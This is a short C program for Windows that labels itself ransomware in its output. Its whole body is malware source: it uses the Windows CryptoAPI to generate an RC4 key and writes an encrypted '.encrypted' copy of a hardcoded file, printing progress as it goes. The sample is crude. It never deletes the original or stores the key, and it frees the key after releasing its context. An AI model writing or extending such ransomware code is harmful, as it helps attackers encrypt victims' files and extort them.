#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

void encrypt_file(LPCWSTR filename)
{
    BYTE buffer[1024];
    DWORD bytesRead, bytesWritten;
    
    printf("[Ransomware] Attempting to encrypt: %S\n", filename);
    
    // Open the original file
    HANDLE originalFile = CreateFileW(filename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (originalFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open input file. Error: %lu\n", GetLastError());
        return;
    }
    
    // Create encrypted version with .encrypted extension
    wchar_t encrypted_filename[MAX_PATH];
    wcscpy(encrypted_filename, filename);
    wcscat(encrypted_filename, L".encrypted");
    
    HANDLE newFile = CreateFileW(encrypted_filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (newFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create encrypted file. Error: %lu\n", GetLastError());
        CloseHandle(originalFile);
        return;
    }

    // Get cryptographic provider
    HCRYPTPROV hProv;
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        printf("[-] Failed to acquire crypto context. Error: %lu\n", GetLastError());
        CloseHandle(originalFile);
        CloseHandle(newFile);
        return;
    }

    // Generate session key
    HCRYPTKEY hKey;
    if (!CryptGenKey(hProv, CALG_RC4, CRYPT_EXPORTABLE, &hKey)) {
        printf("[-] Failed to generate encryption key. Error: %lu\n", GetLastError());
        CryptReleaseContext(hProv, 0);
        CloseHandle(originalFile);
        CloseHandle(newFile);
        return;
    }

    printf("[+] Encrypting file...\n");
    DWORD totalEncrypted = 0;
    
    // Read, encrypt, and write the file
    while(ReadFile(originalFile, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0)
    {
        // Store original size for encryption
        DWORD originalSize = bytesRead;
        
        if (!CryptEncrypt(hKey, 0, bytesRead < sizeof(buffer), 0, buffer, &bytesRead, sizeof(buffer))) {
            printf("[-] Encryption failed. Error: %lu\n", GetLastError());
            break;
        }
        
        if (!WriteFile(newFile, buffer, bytesRead, &bytesWritten, NULL)) {
            printf("[-] Write failed. Error: %lu\n", GetLastError());
            break;
        }
        
        totalEncrypted += bytesWritten;
        printf("[+] Encrypted %lu bytes... (Total: %lu)\n", bytesWritten, totalEncrypted);
    }

    // Clean up
    CryptReleaseContext(hProv, 0);
    CryptDestroyKey(hKey);
    CloseHandle(originalFile);
    CloseHandle(newFile);
    
    printf("[+] File encrypted successfully: %S\n", encrypted_filename);
    printf("[+] Total bytes encrypted: %lu\n", totalEncrypted);
}

int main()
{
    printf("========================================\n");
    printf("[Ransomware] Starting encryption process\n");
    printf("========================================\n");
    
    // Encrypt the target file
    encrypt_file(L"text.txt");
    
    printf("[Ransomware] Process completed.\n");
    printf("Press any key to exit...\n");
    getchar();
    return 0;
}
        